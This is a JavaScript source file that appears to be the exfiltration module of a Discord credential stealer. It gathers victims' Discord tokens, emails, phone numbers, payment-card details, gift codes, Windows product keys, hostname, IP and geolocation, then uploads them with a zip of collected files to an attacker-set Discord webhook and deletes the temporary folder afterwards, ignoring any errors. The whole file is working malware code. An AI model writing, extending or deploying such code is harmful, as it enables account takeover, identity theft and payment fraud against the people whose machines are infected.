const { webhook } = require('../config');
const { isValidURL } = require('../util/string');
const axios = require('axios');
const { join, sep } = require('path');
const os = require('os');
const fs = require('fs');
const { tempFolder } = require('../index');
const FormData = require('form-data');
const { rmSync, readFileSync } = require('fs');
const { userAgent } = require('../config');
const { nitroSubscriptionType, billingType, accountFlags, avatarURL } = require('../util/discord-account');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const json = async (zipFile) => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
  const computerInfoFields = [
    ['RAM', Math.round(os.totalmem() / 1000) + 'MB'],
    ['Name', os.hostname()],
    ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
    ['Username', os.userInfo().username],
    ['OS version', os.version()],
    ['Product Key', `\`\`${require('./product-key').productKey}\`\``],
    ['Backup Product Key', `\`\`${require('./product-key').backupProductKey}\`\``],
  ];
  const ipInfoFields = [
    ['IP Address', `[${await ipInfo('query')}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
    ['Location', `[${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
    ['ISP', await ipInfo('isp')],
  ];

  const embeds = [
    {
      title: 'Computer Info',
      fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
    },
    {
      title: 'IP Info',
      fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
    }
  ];
  discordAccountInfo.accounts.forEach(account => { embeds.push({
    description: `Token: \`\`\`\n${account.token}\n\`\`\``,
    author: {
      name: `${account.username}#${account.discriminator}`,
      icon_url: avatarURL(account.id, account.avatar)
    },
    fields: [
      ['ID', account.id],
      ['Bio', account.bio],
      ['Locale', account.locale],
      ['NSFW Allowed', account.nsfw_allowed],
      ['MFA Enabled', account.mfa_enabled],
      ['Email', `${account.email}${account.verified ? ' (verified)' : ' (not verified)'}` || 'No Email'],
      ['Phone Number', account.phone || 'No Phone Number'],
      ['Nitro Subscription', nitroSubscriptionType(account.premium_type)],
      ['Flags', accountFlags(account.flags)],
    ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
    color: account.accent_color,
  }); });
  discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
    title: `Discord Account - Billing - ${billingType(billing.type)}`,
    fields: (billing.type === 1 ? [
      ['Default', billing.default],
      ['Name', billing.billing_address.name],
      ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
      ['Ends in', billing.last_4],
      ['Brand', billing.brand],
      ['Expires in', billing.expires_month + '/' + billing.expires_year]
    ] : [
      ['Default', billing.default],
      ['Name', billing.billing_address.name],
      ['Email', billing.email],
      ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
    ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
  }); }) : embeds.push({
    title: 'Discord Account - Billing', description: 'No Billing'
  });
  embeds.push({
    title: 'Discord Account - Promotions',
    description: discordAccountInfo.gifts.map(gift => {
      return `**${gift.promotion.outbound_title}** - \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
    }).join('\n')
  });
  return {
    content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
    attachments: [
      {
        id: 0,
        filename: zipFile?.split(sep)?.pop(),
        description: 'A zip archive containing all the files.',
        content_type: 'application/zip',
        url: `attachment://${zipFile?.split(sep)?.pop()}`,
      }
    ]
  };
};

module.exports = async (zipFile) => {
  const data = new FormData();
  data.append('files[0]', fs.createReadStream(zipFile));
  data.append('payload_json', JSON.stringify(await json(zipFile)));

  axios.post(webhook.url, data, {
    headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
  })
    .then(() => {
      // Zip sent to Discord webhook, now we can delete all the files
      rmSync(tempFolder, { recursive: true });
    })
    .catch(() => {});
};
